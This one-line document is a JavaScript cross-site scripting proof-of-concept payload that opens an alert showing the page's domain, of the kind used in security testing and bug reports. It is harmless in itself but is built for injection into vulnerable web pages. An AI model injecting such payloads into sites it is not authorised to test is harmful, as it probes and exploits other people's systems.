alert("XSS on " + document.domain)
